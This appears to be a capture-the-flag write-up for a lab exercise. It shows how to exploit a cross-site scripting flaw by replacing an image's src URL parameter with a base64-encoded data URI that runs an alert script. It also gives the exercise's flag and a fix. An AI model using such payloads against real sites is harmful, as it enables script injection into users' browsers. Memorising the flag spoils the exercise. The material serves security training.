# Where:
    /
# How:

-Click the 3rd image on the index page

-Encode the following script into base 64 using [Base 64](https://www.base64encode.org/)

    (<script>alert('this works')</script>)

-Get following hash:

    ICg8c2NyaXB0PmFsZXJ0KCd0aGlzIHdvcmtzJyk8L3NjcmlwdD4pCg==

-Change the src value from 'nsa' to:

    data:text/html;base64,ICg8c2NyaXB0PmFsZXJ0KCd0aGlzIHdvcmtzJyk8L3NjcmlwdD4pCg==

-Press *Enter* to go to url with altered parameter to receive the flag.

# Flag:
    928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D

# Possible abuses:

Can trick the client-side into running a malicious script.

# Fix:

Don't take the source of an image as a variable in the url.
Rather have source stored somewhere secure and use ids to tell back end which source to use.
If you have to send the source rather use POST.